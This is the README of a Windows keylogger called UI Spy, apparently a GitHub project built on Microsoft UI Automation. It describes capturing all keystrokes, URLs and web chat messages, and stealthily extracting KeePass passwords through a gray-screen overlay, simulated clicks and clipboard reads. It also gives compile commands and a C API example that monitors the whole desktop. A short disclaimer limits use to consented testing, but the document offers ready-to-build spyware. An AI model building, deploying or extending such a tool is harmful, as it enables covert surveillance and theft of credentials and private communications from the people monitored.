# UI Spy — Keylogger Powered by Microsoft UI Automation

**DISCLAIMER**:
**This is a full-featured keylogger.**
It captures all text input, chat messages, URL, credentials, and decrypts KeePass passwords by simulating user actions and reading the clipboard.
**Use ONLY for legal purposes: security testing, auditing, debugging with explicit user consent.**

---

## Features

| Feature                      | How It Works                                                                 |
|------------------------------|------------------------------------------------------------------------------|
| **Global Keylogging**        | Intercepts TextChanged and ValueProperty via UIA                          |
| **URL Monitoring**           | Firefox: finds urlbar input, extracts full URL and domain                  |
| **Web Chat Logging**         | WhatsApp/Slack Firefox: detects textbox by ARIA role, logs recipient + message |
| **KeePass Password Extraction** | On entry selection: hides window, overlays gray screen, clicks "Copy Password", reads clipboard |
| **Input Simulation**         | Moves mouse, sends clicks using SetCursorPos + mouse_event               |
| **Targeted Monitoring**      | By window name, PID, or entire desktop                           |
| **Stealth**                  | Uses official accessibility API bypasses most anti-keyloggers         |
| **Log Queue**                | Up to 20,000 lines, non blocking read via spy_read_line_w            |
| **C API**                    | spy_start, spy_stop, spy_read_line_w embeddable in any project |

---

### Demonstration of the result

![Demonstration of the result](https://raw.githubusercontent.com/Yuragy/Keylogger_Win64/main/test.gif)

> The animation shows real-time keystroke logging.

---
## Build Instructions STL + MSVC

### Requirements
- **Windows 10/11**
- **Visual Studio 2022**
- **Windows SDK**

### Compile MSVC

```
cl *.cpp ^
   /EHsc ^
   /MD ^
   /DUNICODE /D_UNICODE ^
   /link uiautomationcore.lib ole32.lib oleaut32.lib user32.lib psapi.lib
```

> Output: a.exe fully functional keylogger

---

### Compile MinGW-w64 / GCC

```bash
g++ -std=c++17 -municode -O2 *.cpp ^
    -o spy.exe ^
    -luiautomationcore -lole32 -loleaut32 -luser32 -lpsapi
```

---

## Dependencies

| Library                | Purpose                              |
|------------------------|--------------------------------------|
| uiautomationcore.lib | UI Automation API                    |
| ole32.lib, oleaut32.lib | COM, BSTR, VARIANT              |
| user32.lib           | Window enumeration, mouse input      |
| psapi.lib            | Process module info                  |
| STL                | std::wstring, std::mutex, std::thread. |

> No external dependencies pure WinAPI + STL

---

## Usage
```
int main()
{
    if (spy_start(nullptr, 0, 1, 0, 0, 1) != 0) {
        std::wcout << L"[ERROR] Failed to start spy\n";
        return 1;
    }
    std::wcout << L"Keylogger active. Live logs:\n\n";

    wchar_t buffer[8192];
    while (true)
    {
        size_t len = spy_read_line_w(buffer, _countof(buffer));
        if (len > 0) std::wcout << buffer << L'\n';
        if (GetAsyncKeyState(VK_RETURN) & 0x8000) break;
        Sleep(50);
    }
    spy_stop();
    std::wcout << L"\nKeylogger stopped.\n";
    return 0;
}
```
---

## spy_start Parameters

```
spy_start(
    const wchar_t* window_name, // nullptr = entire desktop
    uint32_t pid,               // 0 = ignore
    int timeout_sec,            // debounce, default: 1
    int no_uia_events,          // 1 = disable events
    int no_property_events,     // 1 = disable property changes
    int enable_debug            // 1 = enable debug logs
);
```

---

## Limitations

- Windows only
- UI structure dependent breaks if apps change AutomationId / ARIA roles
- Plaintext logs
- Same session only no RDP/other user capture
- Mouse simulation issues on high DPI or multi monitor setups

